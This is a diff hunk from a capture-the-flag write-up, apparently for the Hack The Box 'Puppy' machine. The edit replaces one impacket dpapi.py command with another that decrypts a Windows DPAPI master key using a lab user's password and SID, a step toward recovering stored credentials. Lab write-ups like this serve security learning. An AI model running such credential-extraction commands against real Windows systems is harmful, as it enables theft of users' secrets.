@@ -435,7 +435,8 @@ C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829
 
 Lets download both the files and save it in our local linux machine and use impacket-dpapi to decode the password.
 ```bash
-dpapi.py credential -file ../../../HTB/Puppy/C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+dpapi.py masterkey -file ../../../HTB/Puppy/556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'Steph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
+
 ```
 .According to the blog the C8---- file which we found in Credentials has the credential key so we gonna use that to get our key.
 ```bash
